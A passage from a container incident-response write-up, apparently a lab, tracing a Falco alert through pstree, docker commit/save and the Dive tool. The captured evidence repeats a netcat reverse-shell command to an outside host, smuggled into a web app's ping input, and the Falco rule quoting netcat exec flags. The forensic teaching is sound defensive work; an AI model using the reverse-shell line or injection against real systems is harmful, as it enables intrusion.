currently running on the underlying host. This is due to one of the foundational compoents that make a container a container, namespaces. Linux namespaces <em>isolate</em> the proceses within containers. What does this look like in practice? Lets look.</p><p>Take for example the following line from a <code>ps aux</code> output ran on a host.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span class=line><span class=cl>root        <span class=m>2954</span>  0.0  0.0   <span class=m>4200</span>   <span class=m>740</span> pts/1    S+   02:41   0:00 ping 8.8.8.8
</span></span></code></pre></div><p>We can see this process has a PID of 2954. Looking at pstree we can see this process is a child of bash, which is a child of containerd-shim</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>systemd<span class=o>(</span>1<span class=o>)</span>───containerd-shim<span class=o>(</span>2396<span class=o>)</span>───bash<span class=o>(</span>2604<span class=o>)</span>───ping<span class=o>(</span>2954<span class=o>)</span>
</span></span></code></pre></div><p>If we exec into the container and run the same ps commands we get a completely different pid:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span class=line><span class=cl>root         <span class=m>379</span>  0.0  0.0   <span class=m>4200</span>   <span class=m>740</span> pts/1    S+   02:41   0:00 ping 8.8.8.8
</span></span></code></pre></div><p>This is due to the Linux namespace restricting our view so we can only see processes that exist &ldquo;within&rdquo; the container. If we attempt to kill PID 2954 on the host from within the container we will get an error that no such process exists. We could however kill process 379 without any issue.</p><p>For a much more indepth explaination I highly reccommend the book <a href=https://www.oreilly.com/library/view/container-security/9781492056690/>Container Security: Fundamental Technology Concepts that Protect Containerized Applications</a> by Liz Rice. Last I checked Aqua security was giving the ebook away for free.</p><hr><h3 id=the-scene>The Scene<a hidden class=anchor aria-hidden=true href=#the-scene>#</a></h3><p>Moving on to a more practical example let&rsquo;s pretend that we get an alert from a Falco agent running on a host. In fact several alerts are generated for this behavior, but for our purposes just the one will be enough to kick of this investigation. Falco is a great tool and free to use. The fact that it is container aware makes very helpful when looking to detect suspicious and malicious behavior in a container environment. The alert which was generated is below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;output&#34;</span><span class=p>:</span> <span class=s2>&#34;21:39:47.159547041: Warning Netcat runs inside container that allows remote code execution (user=www-data user_loginuid=-1 command=nc 172.31.93.20 9876 -e /bin/sh container_id=60795d68fdee container_name=eloquent_babbage image=webapp:v1.0)&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;priority&#34;</span><span class=p>:</span> <span class=s2>&#34;Warning&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;rule&#34;</span><span class=p>:</span> <span class=s2>&#34;Netcat Remote Code Execution in Container&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;source&#34;</span><span class=p>:</span> <span class=s2>&#34;syscall&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;tags&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;mitre_execution&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;network&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;process&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>],</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;time&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-05-10T21:39:47.159547041Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;output_fields&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;container.id&#34;</span><span class=p>:</span> <span class=s2>&#34;60795d68fdee&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;container.image.repository&#34;</span><span class=p>:</span> <span class=s2>&#34;webapp&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;container.image.tag&#34;</span><span class=p>:</span> <span class=s2>&#34;v1.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;container.name&#34;</span><span class=p>:</span> <span class=s2>&#34;eloquent_babbage&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;evt.time&#34;</span><span class=p>:</span> <span class=mi>1652218787159547100</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;proc.cmdline&#34;</span><span class=p>:</span> <span class=s2>&#34;nc 172.31.93.20 9876 -e /bin/sh&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;user.loginuid&#34;</span><span class=p>:</span> <span class=mi>-1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;user.name&#34;</span><span class=p>:</span> <span class=s2>&#34;www-data&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The rule name is <code>Netcat Remote Code Execution in Container</code> (ruh roh). In the output fields section we can see all kinds of useful information such as data about the image, the running container name, the command line associated with the alert, and the user that ran the command. Looking at the <a href=https://github.com/falcosecurity/falco/blob/master/rules/falco_rules.yaml#L2462>rule</a> syntax it is a fairly simple rule.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> spawned_process and container and
</span></span><span class=line><span class=cl>    <span class=o>((</span>proc.name <span class=o>=</span> <span class=s2>&#34;nc&#34;</span> and <span class=o>(</span>proc.args contains <span class=s2>&#34;-e&#34;</span> or proc.args contains <span class=s2>&#34;-c&#34;</span><span class=o>))</span> or
</span></span><span class=line><span class=cl>     <span class=o>(</span>proc.name <span class=o>=</span> <span class=s2>&#34;ncat&#34;</span> and <span class=o>(</span>proc.args contains <span class=s2>&#34;--sh-exec&#34;</span> or proc.args contains <span class=s2>&#34;--exec&#34;</span> or proc.args contains <span class=s2>&#34;-e &#34;</span>
</span></span><span class=line><span class=cl>                              or proc.args contains <span class=s2>&#34;-c &#34;</span> or proc.args contains <span class=s2>&#34;--lua-exec&#34;</span><span class=o>))</span>
</span></span><span class=line><span class=cl>    <span class=o>)</span>
</span></span></code></pre></div><p>The output for the rule is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>output: &gt;
</span></span><span class=line><span class=cl>    Netcat runs inside container that allows remote code execution <span class=o>(</span><span class=nv>user</span><span class=o>=</span>%user.name <span class=nv>user_loginuid</span><span class=o>=</span>%user.loginuid
</span></span><span class=line><span class=cl>    <span class=nv>command</span><span class=o>=</span>%proc.cmdline <span class=nv>container_id</span><span class=o>=</span>%container.id <span class=nv>container_name</span><span class=o>=</span>%container.name <span class=nv>image</span><span class=o>=</span>%container.image.repository:%container.image.tag<span class=o>)</span>
</span></span></code></pre></div><p>If we wanted to have additional information such as process id or parent process id in the output we could add that. Hindsight being what it is, had I thought of this before starting to write this post I would have added pid details to the rule output for additional context.</p><p>Comparing the rule to the process cmdline included in the output_fields we can see clearly why it was triggered.</p><p>On the host when we run <code>ps aux</code> we see an output similar to the one below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span class=line><span class=cl>www-data   <span class=m>12520</span>  0.0  0.0   <span class=m>4296</span>   <span class=m>796</span> ?        S    21:53   0:00 sh -c ping  -c <span class=m>4</span> <span class=p>&amp;</span> nc 172.31.93.20 <span class=m>9876</span> -e /bin/sh
</span></span></code></pre></div><p>Digging deeper if we run <code>pstree -asp 12520</code> we see that the nc process is a child of apache2.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pstree -asp <span class=m>12520</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>systemd,1
</span></span><span class=line><span class=cl>  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
</span></span><span class=line><span class=cl>      └─main.sh,11992 /main.sh
</span></span><span class=line><span class=cl>          └─apache2,12323 -k start
</span></span><span class=line><span class=cl>              └─apache2,12336 -k start
</span></span><span class=line><span class=cl>                  └─sh,12520 -c ping  -c <span class=m>4</span> <span class=p>&amp;</span> nc 172.31.93.20 <span class=m>9876</span> -e /bin/sh
</span></span><span class=line><span class=cl>                      └─sh,12522 -c /bin/sh
</span></span><span class=line><span class=cl>                          └─sh,12523
</span></span></code></pre></div><p>nc usage is common in most place where Linux is used. It is not common to see nc as a child process of apache2. At this point several additional alerts from Falco start to roll in, and after speaking with the application owner we learn nc was added to the container for troubleshooting connectivity issues, but they always ran it from a shell in the container as root never as the apache user (not ideal but it is what it is). The app owners also confirmed they have not been doing any testing recently. If this were a real scenario this host would probably be isolated if possible and attempts would be made to understand what kind of data is processed on the machine. Thankfully this is just a lab and all of that is out of scope for this post :-).</p><p>We know there is an active nc session, but what else has occured in the container? Let&rsquo;s dive into the image a figure it out.</p><hr><h3 id=carving-the-running-container-out>Carving the running container out<a hidden class=anchor aria-hidden=true href=#carving-the-running-container-out>#</a></h3><p>First lets grab the eqivilant of a disk image of the running container this. We&rsquo;ll be able to perform an analysis on the image and it also preserves the image in the event that the container is killed. <em>Note: this post mainly focuses on the container itself, opperating within a Kubernetes cluster is highly likely in a scenario similar to this. There are additional things that should occur when performing analysis on a Kubernetes cluster to preserve and protect both the running container and the host that the container is running on. Failure to do so may result in the entire node being terminated and all relevant evidence along with it.</em></p><p>Lets determine the container id where this process lives. We can do this by looking at the <code>-id</code> parameter associated with the containerd-shim process from the pstree command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  └─containerd-shim,11971 -namespace moby -id 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216 -address /run/containerd/containerd.sock
</span></span></code></pre></div><p>If multiple containers exist we would need to trace the tree up to the relevant container-shim process. Additionally in our scenario Falco provided the container id in the alert for us.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s2>&#34;container.id&#34;</span>: <span class=s2>&#34;60795d68fdee&#34;</span>,
</span></span></code></pre></div><p>If we want we can run the <code>docker ps</code> command to validate the container is still running.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker ps
</span></span><span class=line><span class=cl>CONTAINER ID   IMAGE                  COMMAND      CREATED       STATUS       PORTS                               NAMES
</span></span><span class=line><span class=cl>60795d68fdee   webapp:v1.0   <span class=s2>&#34;/main.sh&#34;</span>   <span class=m>3</span> hours ago   Up <span class=m>3</span> hours   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp   eloquent_babbage
</span></span></code></pre></div><p>Now that we know the container ID we can create an image from the running container preserving any changes that have occured since the container was launched. The commit command below tells docker to create a new image name <code>sec-incident</code>, tag it with <code>123</code>, and use the running container id <code>6079</code> to build the image. Effectivly taking a snapshot of the container as it currently exists.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker commit <span class=m>6079</span> sec-incident:123
</span></span></code></pre></div><p>When we run the <code>docker images</code> command we see our new image, as well as the orignal image the container launched with.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>REPOSITORY             TAG       IMAGE ID       CREATED          SIZE
</span></span><span class=line><span class=cl>sec-incident           <span class=m>123</span>       9f64c8bead0e   <span class=m>21</span> seconds ago   845MB
</span></span><span class=line><span class=cl>webapp                 v1.0      7adda9b17363   <span class=m>3</span> hours ago      714MB
</span></span></code></pre></div><p>Comparing the sizes of the two images there have been lots of changes within the image since it was first launched. Next we will <code>save</code> the image to disk so it is portable and can be moved to our analysis workstation.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker save sec-incident:123 -o sec-incident.tar
</span></span></code></pre></div><p>It is important to note we are using the <code>docker save</code> command specifying the image we created from the running container instead of the <code>docker export</code> command on the running container. Both will produce a tar file. The biggest difference is that the export command will flatten the image/layer history. Save on the other hand will preserve all of the layer history. For our use case preserving the history is very helpful when analyzing how the image has shifted from its initial launch. From here as an analyst the tar files will more than likely be exported to an analysis machine.</p><p>Once we are on our analyst workstation we need to perform a <code>docker load</code> on the tar file produced from the <code>docker save</code> command above. This will trigger the following output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>docker load &lt; sec-incident.tar
</span></span><span class=line><span class=cl>a75caa09eb1f: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>    105MB/105MB
</span></span><span class=line><span class=cl>80f9a8427b18: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  494.7MB/494.7MB
</span></span><span class=line><span class=cl>97a1040801c3: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  7.168kB/7.168kB
</span></span><span class=line><span class=cl>acf8abb873ce: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  5.655MB/5.655MB
</span></span><span class=line><span class=cl>9713610e6ec4: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  5.632kB/5.632kB
</span></span><span class=line><span class=cl>73e92d5f2a6c: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  5.658MB/5.658MB
</span></span><span class=line><span class=cl>585e40f29c46: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  114.3MB/114.3MB
</span></span><span class=line><span class=cl>deeea3c4d56f: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  2.048kB/2.048kB
</span></span><span class=line><span class=cl>9ef9e3967882: Loading layer <span class=o>[==================================================</span>&gt;<span class=o>]</span>  121.7MB/121.7MB
</span></span><span class=line><span class=cl>Loaded image: sec-incident-123:latest
</span></span></code></pre></div><p>From this output we can tell there are 9 unique layers to this image.</p><hr><h3 id=what-is-an-image>What is an Image<a hidden class=anchor aria-hidden=true href=#what-is-an-image>#</a></h3><p>Before progressing any further lets take a step back and talk about what an image is. An image according to docker.com is &ldquo;&mldr;a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.&rdquo; Technically however an image is just a collection of tar&rsquo;d files/folders. Each layer is a folder within the tar file. Within each layers folder contains information about the layer, and then any files associated with that particular layer.</p><p>In our example when we extract the sec-incident.tar file we see an output that contains a layer folder, inside of that folder is a VERSION, json, and layer.tar file. Additionally at the root level of the image there is <code>manifest.json</code>, <code>repositories</code>, and a <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> file. The <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> file uses the hash of the image. The image hash is a sha256sum of this config file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tar -xvf sec-incident.tar
</span></span><span class=line><span class=cl>1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/
</span></span><span class=line><span class=cl>1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/VERSION
</span></span><span class=line><span class=cl>1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/json
</span></span><span class=line><span class=cl>1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar
</span></span><span class=line><span class=cl>2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/
</span></span><span class=line><span class=cl>2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/VERSION
</span></span><span class=line><span class=cl>2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/json
</span></span><span class=line><span class=cl>2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar
</span></span><span class=line><span class=cl>69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/
</span></span><span class=line><span class=cl>69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/VERSION
</span></span><span class=line><span class=cl>69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/json
</span></span><span class=line><span class=cl>69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar
</span></span><span class=line><span class=cl>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/
</span></span><span class=line><span class=cl>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/VERSION
</span></span><span class=line><span class=cl>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/json
</span></span><span class=line><span class=cl>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar
</span></span><span class=line><span class=cl>8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/
</span></span><span class=line><span class=cl>8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/VERSION
</span></span><span class=line><span class=cl>8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/json
</span></span><span class=line><span class=cl>8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar
</span></span><span class=line><span class=cl>9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/
</span></span><span class=line><span class=cl>9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/VERSION
</span></span><span class=line><span class=cl>9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/json
</span></span><span class=line><span class=cl>9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar
</span></span><span class=line><span class=cl>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json
</span></span><span class=line><span class=cl>a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/
</span></span><span class=line><span class=cl>a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/VERSION
</span></span><span class=line><span class=cl>a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/json
</span></span><span class=line><span class=cl>a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar
</span></span><span class=line><span class=cl>c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/
</span></span><span class=line><span class=cl>c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/VERSION
</span></span><span class=line><span class=cl>c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/json
</span></span><span class=line><span class=cl>c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar
</span></span><span class=line><span class=cl>c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/
</span></span><span class=line><span class=cl>c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/VERSION
</span></span><span class=line><span class=cl>c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/json
</span></span><span class=line><span class=cl>c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar
</span></span><span class=line><span class=cl>ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/
</span></span><span class=line><span class=cl>ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/VERSION
</span></span><span class=line><span class=cl>ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/json
</span></span><span class=line><span class=cl>ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar
</span></span><span class=line><span class=cl>caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/
</span></span><span class=line><span class=cl>caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/VERSION
</span></span><span class=line><span class=cl>caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/json
</span></span><span class=line><span class=cl>caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar
</span></span><span class=line><span class=cl>manifest.json
</span></span><span class=line><span class=cl>repositories
</span></span></code></pre></div><p>The <code>manifest.json</code> file shows us information about the layers in the image as well as the repo/tags associated with the image</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Config&#34;</span><span class=p>:</span> <span class=s2>&#34;9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;RepoTags&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;sec-incident:123&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Layers&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;69357d9443c362104c1cb648c321c7c67f69e44dbe0e165d61a0e7a97fe4a681/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;9b343757fc4d7aa18af8ba7b988dcc2cae4aa68941e118a2663854a210b08dfb/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;1e258db2bc4b80ddf6b0234a753e67e68afc57f5b68bd63091b2463f98239db6/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;c4e25f8bd6f234eb87af3d94ad1b36cb6d2f8ac48ae98d350371814945b0db27/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;c1def0ce6c299d5c3e65ddd3ba912535ca8e957e4396d2603e4044eb526879b4/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;a64a14b19fd1c49f9ee5be1004c573841060e6543c4a5ec24081d5f12fb16fde/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;2f791a144bbd21a878ac1cbdc315271f2d64b7d059cfd5bdc0a0b23a9f84a861/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;caf4b5489e6096309d0746684ba5371f28dea80bf8aa2251df2badc6d8340aab/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;8c01d32055aa0185b6f431699215c02c6c61992f632ced61260ce79ce757e9e5/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;ca545f5f7989cbac3c4e11e1f48ff7b56b7e71de4aae7286a06484160377f18a/layer.tar&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2/layer.tar&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span></code></pre></div><p>The <code>repositories</code> file is just meta-data about the image:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;sec-incident&#34;</span><span class=p>:{</span><span class=nt>&#34;123&#34;</span><span class=p>:</span><span class=s2>&#34;6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2&#34;</span><span class=p>}}</span>
</span></span></code></pre></div><p>When we look at the <code>9f64c8bead0ee4c81d3cbf354000bcfa73fb2172b2bb475ed814f2ed21543192.json</code> config file we can see all of the layers and what commands were used to create the layer. Below is a snip from the file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2018-10-12T17:49:01.240444043Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created_by&#34;</span><span class=p>:</span> <span class=s2>&#34;/bin/sh -c #(nop)  ENTRYPOINT [\&#34;/main.sh\&#34;]&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;empty_layer&#34;</span><span class=p>:</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-05-10T21:32:10.671619454Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created_by&#34;</span><span class=p>:</span> <span class=s2>&#34;/bin/sh -c #(nop) COPY file:2d20aa4eee806c995fcc211ba0077b67c72aa53ac0ba27ec57a721820907c4ff in /bin/nc &#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-05-10T21:32:11.329409992Z&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created_by&#34;</span><span class=p>:</span> <span class=s2>&#34;/bin/sh -c chmod +x /bin/nc&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=err>,</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nt>&#34;created&#34;</span><span class=p>:</span> <span class=s2>&#34;2022-05-11T00:38:09.016419258Z&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>In the above output we can clearly see the original image launch layer which was created 2018-10-12 by the command <code>/bin/sh -c</code> with the entrypoint of <code>main.sh</code>. Below that we see two additional layers added by the application owner for troubleshooting purposes where they copied <code>nc</code> into the image and then made the file executable <code>/bin/sh -c chmod +x /bin/nc</code>. The last layer only has a timestamp, but no other information. This is the layer where we will want to look because it will contain any changes to the file system since the container was started. Before we start to unpack each layer and manually trompsing through all the files lets make things easier and utilize a tool built specifically to help us visualize the data we want to see.</p><hr><h3 id=dive>Dive<a hidden class=anchor aria-hidden=true href=#dive>#</a></h3><p>There are a few different tools that can be used to perform static analysis of a container image. One of my favorites is <a href=https://github.com/wagoodman/dive>dive</a>. Dive is &ldquo;a tool for exploring a docker image, layer contents, and discovering ways to shrink the size of your Docker/OCI Image.&rdquo; Obviously for our purposes we do not care about shrinking the image we just want to be able to explore the image at each of the various layers.</p><p>Once installed on our analysis system we can run the tool with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dive sec-incident:123
</span></span></code></pre></div><p>This will process our image and provide us with a really nice ui to navigate through it.</p><p>Once the ui loads in the top left panel we can see all of the image layers. Using the arrow keys we can move between the layers. The bottom layer contains all of the changes that occurred since the image was started up to the time we saved the image. In our case ~132MB of changes occured.</p><p><img loading=lazy src=images/dive-layers.png alt=dive-layers.png title=dive-layers></p><p>In the section below we can see the layer details. This includes the ID and Digest. We will use the Id (<code>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2</code>) later when we go to extract specific files from the image.</p><p><img loading=lazy src=images/dive-layer-details.png alt=dive-layer-details.png title=dive-layer-details></p><p>On the right we can see all of the contents of the filesystem at the current layer. Pressing <code>tab</code> will allow us to use the arrow keys once again to navigate through the file system, space will collapse/expand a folder. This includes files from the previous layers. Dive color codes the files to show files that are new to the layer (green) and those files which have been modified when compared to the previous layer (yellow).</p><p><img loading=lazy src=images/dive-layer-contents.png alt=dive-layer-contents.png title=dive-layer-contents></p><p>We can see that a new php session file was created, and that the access and error log files were modified, likely due to webtraffic to the application. In the image below we see several new files that have been created. Each file is worth digging into deeper to gain some understanding as to what has occurred.</p><p><img loading=lazy src=images/dive-layer-contents-2.png alt=dive-layer-contents-2.png title=dive-layer-contents-2></p><p>Unfortunatly dive does not offer the ability to extract a file directly. To dig into the files themselves to better understand what has occured we will have to extract the layer from the raw image file.</p><hr><h3 id=file-analysis>File Analysis<a hidden class=anchor aria-hidden=true href=#file-analysis>#</a></h3><p>Back in our extracted image folder we can use the layer id identified using Dive to selectivly target the layer we want.</p><p>We want to carve files out that occured within the most recent layer created for the image. Using the what we learned from Dive we know the layer id we want to explore is <code>6d07a8a501ec407bab89b3e4843765871b2535f6c014766e39593e301a864cb2</code>.</p><p><img loading=lazy src=images/extracted-layer-details.png alt=extracted-layer-details.png 